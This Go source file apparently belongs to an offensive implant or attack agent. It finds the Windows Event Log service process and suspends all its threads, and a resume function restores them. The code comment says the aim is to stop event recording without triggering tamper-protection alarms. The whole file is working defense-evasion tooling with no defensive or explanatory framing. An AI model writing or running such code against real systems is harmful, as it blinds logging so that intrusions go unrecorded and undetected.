//go:build windows

package agent

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procSuspendThread = kernel32.NewProc("SuspendThread")
	procResumeThread  = kernel32.NewProc("ResumeThread")
)

// eventlogSuspend suspends all threads of the Windows Event Log service,
// stopping event recording without triggering tamper-protection alarms.
func eventlogSuspend() string {
	return suspendServiceThreads("EventLog")
}

// eventlogResume resumes all threads of the Windows Event Log service.
func eventlogResume() string {
	return resumeServiceThreads("EventLog")
}

func getServicePID(serviceName string) (uint32, error) {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_ENUMERATE_SERVICE)
	if err != nil {
		return 0, fmt.Errorf("OpenSCManager: %w", err)
	}
	defer windows.CloseServiceHandle(scm)

	svcNameW, err := windows.UTF16PtrFromString(serviceName)
	if err != nil {
		return 0, err
	}
	svc, err := windows.OpenService(scm, svcNameW, windows.SERVICE_QUERY_STATUS)
	if err != nil {
		return 0, fmt.Errorf("OpenService: %w", err)
	}
	defer windows.CloseServiceHandle(svc)

	var needed uint32
	// First call to get required buffer size
	_ = windows.QueryServiceStatusEx(svc, windows.SC_STATUS_PROCESS_INFO, nil, 0, &needed)
	buf := make([]byte, needed)
	if err := windows.QueryServiceStatusEx(svc, windows.SC_STATUS_PROCESS_INFO, &buf[0], needed, &needed); err != nil {
		return 0, fmt.Errorf("QueryServiceStatusEx: %w", err)
	}
	status := (*windows.SERVICE_STATUS_PROCESS)(unsafe.Pointer(&buf[0]))
	return status.ProcessId, nil
}

func suspendServiceThreads(serviceName string) string {
	pid, err := getServicePID(serviceName)
	if err != nil {
		return "[-] " + err.Error()
	}
	if pid == 0 {
		return fmt.Sprintf("[-] %s service not running", serviceName)
	}

	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return "[-] CreateToolhelp32Snapshot: " + err.Error()
	}
	defer windows.CloseHandle(snap)

	var entry windows.ThreadEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	count := 0
	for err := windows.Thread32First(snap, &entry); err == nil; err = windows.Thread32Next(snap, &entry) {
		if entry.OwnerProcessID == pid {
			th, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, entry.ThreadID)
			if err == nil {
				procSuspendThread.Call(uintptr(th))
				windows.CloseHandle(th)
				count++
			}
		}
	}
	return fmt.Sprintf("[+] suspended %d threads of %s (PID %d)", count, serviceName, pid)
}

func resumeServiceThreads(serviceName string) string {
	pid, err := getServicePID(serviceName)
	if err != nil {
		return "[-] " + err.Error()
	}
	if pid == 0 {
		return fmt.Sprintf("[-] %s service not running", serviceName)
	}

	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return "[-] CreateToolhelp32Snapshot: " + err.Error()
	}
	defer windows.CloseHandle(snap)

	var entry windows.ThreadEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	count := 0
	for err := windows.Thread32First(snap, &entry); err == nil; err = windows.Thread32Next(snap, &entry) {
		if entry.OwnerProcessID == pid {
			th, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, entry.ThreadID)
			if err == nil {
				procResumeThread.Call(uintptr(th))
				windows.CloseHandle(th)
				count++
			}
		}
	}
	return fmt.Sprintf("[+] resumed %d threads of %s (PID %d)", count, serviceName, pid)
}
